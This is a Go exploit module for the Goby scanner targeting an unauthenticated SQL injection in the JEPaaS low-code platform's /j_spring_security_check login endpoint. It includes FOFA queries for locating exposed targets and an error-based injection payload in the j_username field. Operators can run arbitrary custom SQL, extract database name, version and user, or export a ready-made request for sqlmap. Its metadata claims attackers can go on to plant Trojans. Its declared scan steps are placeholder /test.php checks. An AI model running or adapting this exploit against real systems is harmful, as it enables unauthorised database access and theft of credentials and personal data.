package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JEPaaS /j_spring_security_check SQL Injection Vulnerability",
    "Description": "<p>JEPaaS is an excellent software platform product, visual development environment, low-code drag-and-drop configuration development, extremely simple operation, can help solve 80% of the repetitive work of Java projects, let development pay more attention to business logic, greatly improve development efficiency, can help companies greatly save labor costs and time costs, while losing flexibility. It is suitable for building all enterprise information management systems such as OA, ERP, CRM, HR, HIS, etc. (and suitable for group company deployment). </p><p>In addition to exploiting the SQL injection vulnerability at the j_spring_security_check interface of the JEPaaS low-code platform, an unauthenticated remote attacker can not only exploit the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), but also write Trojans to the server in the case of high privilege to further obtain server system privileges.</p>",
    "Product": "JEPaaS",
    "Homepage": "https://www.jepaas.com/",
    "DisclosureDate": "2024-06-13",
    "PostTime": "2024-10-30",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/saas/saasYhAction!sendRandom.action\" && body=\"/JE/resource/css/icon.css\"",
    "GobyQuery": "body=\"/saas/saasYhAction!sendRandom.action\" && body=\"/JE/resource/css/icon.css\"",
    "Level": "1",
    "Impact": "<p>In addition to exploiting the SQL injection vulnerability at the j_spring_security_check interface of the JEPaaS low-code platform, an unauthenticated remote attacker can not only exploit the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), but also write Trojans to the server in the case of high privilege to further obtain server system privileges.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/139650310"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "JEPaaS 低代码平台 /j_spring_security_check SQL 注入漏洞",
            "Product": "JEPaaS",
            "Description": "<p>JEPaaS是一款优秀的软件平台产品，可视化开发环境，低代码拖拽式配置开发，操作极其简单，可以帮助解决Java项目80%的重复工作，让开发更多关注业务逻辑，大大提高开发效率，能帮助公司大幅节省人力成本和时间成本，同时又不失灵活性。适用于搭建 OA、ERP、CRM、HR、HIS等所有的企业信息管理系统（且适用于集团公司部署）。<br></p><p>JEPaaS 低代码平台 j_spring_security_check 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>JEPaaS 低代码平台 j_spring_security_check 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "JEPaaS /j_spring_security_check SQL Injection Vulnerability",
            "Product": "JEPaaS",
            "Description": "<p>JEPaaS is an excellent software platform product, visual development environment, low-code drag-and-drop configuration development, extremely simple operation, can help solve 80% of the repetitive work of Java projects, let development pay more attention to business logic, greatly improve development efficiency, can help companies greatly save labor costs and time costs, while losing flexibility. It is suitable for building all enterprise information management systems such as OA, ERP, CRM, HR, HIS, etc. (and suitable for group company deployment).&nbsp;</p><p>In addition to exploiting the SQL injection vulnerability at the j_spring_security_check interface of the JEPaaS low-code platform, an unauthenticated remote attacker can not only exploit the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), but also write Trojans to the server in the case of high privilege to further obtain server system privileges.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to exploiting the SQL injection vulnerability at the j_spring_security_check interface of the JEPaaS low-code platform, an unauthenticated remote attacker can not only exploit the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), but also write Trojans to the server in the case of high privilege to further obtain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	setSqlPayloadHashscajjcbhsjabchgjasbcjegyufbakubkfyaksbgvfgbeafgcbfukaef := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			sql = `1') AND 1066 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(120)+CHAR(112)+CHAR(113)+(` + sql + `)+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(107)+CHAR(113)))--`
			//sql进行了url编码
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			postRequest.Data = "j_username=" + sql
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/j_spring_security_check"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/j_spring_security_check"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "tblgqlvq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT (CHAR(116)+CHAR(98)+CHAR(108)+CHAR(103)+CHAR(113)+CHAR(108)+CHAR(118)+CHAR(113))`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qjxpq((.|\n)*?)qbqkq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashscajjcbhsjabchgjasbcjegyufbakubkfyaksbgvfgbeafgcbfukaef
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /j_spring_security_check HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
j_username=%31%27%29%20%41%4e%44%20%31%30%36%36%20%49%4e%20%28%53%45%4c%45%43%54%20%28%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%31%32%29%2b%43%48%41%52%28%31%31%33%29%2b%28%53%45%4c%45%43%54%20%27%61%27%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%39%38%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%30%37%29%2b%43%48%41%52%28%31%31%33%29%29%29%2d%2d`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qjxpq((.|\n)*?)qbqkq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashscajjcbhsjabchgjasbcjegyufbakubkfyaksbgvfgbeafgcbfukaef
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "select DB_NAME()"
					} else if way == "db_version" {
						sql = "select @@VERSION"
					} else if way == "user_name" {
						sql = "select SYSTEM_USER"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
